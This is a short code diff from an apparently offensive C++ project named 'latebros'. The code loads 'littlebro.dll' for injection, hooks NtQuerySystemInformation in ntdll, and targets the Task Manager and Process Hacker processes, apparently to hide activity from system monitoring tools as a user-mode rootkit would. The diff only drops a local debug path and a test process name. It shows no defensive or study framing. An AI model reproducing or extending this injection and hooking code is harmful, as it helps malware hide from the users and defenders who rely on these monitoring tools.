@@ -10,7 +10,6 @@ int main()
 
 	// READ LITTLEBRO FROM DISK FOR INJECTION
 	auto littlebro_buffer = binary_file::read_file("littlebro.dll");
-	//auto littlebro_buffer = binary_file::read_file("D:\\Sync\\Programming\\C++\\Projects\\latebros\\x64\\Debug\\littlebro.dll");
 
 	// SETUP HOOK CONTAINER
 	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
@@ -23,7 +22,7 @@ int main()
 		{ "ntdll.dll", "NtQuerySystemInformation", "qsi" }
 	};
 
-	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe", "Project1.exe" })
+	for (const auto& process_name : { "taskmgr.exe", "ProcessHacker.exe" })
 	{
 		auto process_list = process::get_all_from_name(process_name);
 
